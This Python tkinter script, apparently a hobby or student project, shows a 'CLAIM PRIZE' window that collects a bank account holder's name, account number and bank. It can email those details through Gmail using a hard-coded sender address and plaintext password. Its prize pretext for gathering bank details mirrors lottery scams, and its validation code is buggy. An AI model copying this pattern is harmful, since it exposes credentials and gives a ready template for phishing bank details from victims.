from tkinter import *
from tkinter import messagebox
import random
from PIL import ImageTk, Image
from tkinter import ttk
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
# import sign_in

root = Tk()
root.geometry("460x500")
root.title('CLAIM PRIZE')
root.config(bg='#f48c06')


def exit():
    root.destroy()


def email_validation(email):
    try:
        sender_email_id = 'lottowinners957@gmail.com'
        receiver_email_id = email
        password = "GETRICHWITHLOTTO"
        subject = "Your Details"
        msg = MIMEMultipart()
        msg['From'] = sender_email_id
        msg['To'] = receiver_email_id
        msg['Subject'] = subject
        body = f'bank account details: \n Bank: {cbBank.get()} \n Account Holder: {entyAccHolder.get()} \n Account Number: {entyAccNumber.get()}'
        msg.attach(MIMEText(body, 'plain'))
        text = msg.as_string()
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(sender_email_id, password)
        s.sendmail(sender_email_id, receiver_email_id, text)
        s.quit()
    except ValueError:
        messagebox.showinfo("", "Invalid email")
    messagebox.showinfo("", "Check your email for further instructions")


def validation(accHolder, accNum):
    if (len(accHolder) == 0) or (len(accNum == 0)) or (accNum < 9):
        messagebox.showerror("", "Invalid info. Please try again")


pic1 = Image.open("logo.png")
resize = pic1.resize((100, 80), Image.ANTIALIAS)
logo = ImageTk.PhotoImage(resize)
lbpic = Label(root, image=logo, bg='#f48c06')
lbpic.place(x=350, y=5)

lbHeading = Label(root, text='Banking Details', font='Times 30', bg='#f48c06')
lbHeading.place(x=80, y=40)

lbAccHolder = Label(root, text='Account Holder Name', bg='#f48c06')
lbAccHolder.place(x=80, y=120)
entyAccHolder = Entry(root, width=30)
entyAccHolder.place(x=80, y=145)


lbAccNumber = Label(root, text='Account Number', bg='#f48c06')
lbAccNumber.place(x=80, y=180)
entyAccNumber = Entry(root, width=30)
entyAccNumber.place(x=80, y=200)


lbBank = Label(root, text='Bank', bg='#f48c06')
lbBank.place(x=80, y=235)
cbBank = ttk.Combobox(root)
cbBank['values'] = ["ABSA", "CAPITEC", "FNB", "STANDARD BANK"]
cbBank.place(x=80, y=255)


btnSubmit = Button(root, text='SUBMIT', width=20, borderwidth=3, command=exit)
btnSubmit.place(x=80, y=300)

# lambda: [email_validation(sign_in.entyEmail.get()), validation(entyAccHolder.get(), entyAccNumber.get())]
btnExit = Button(root, text='EXIT', borderwidth=7, command=exit)
btnExit.place(x=80, y=390)

root.mainloop()
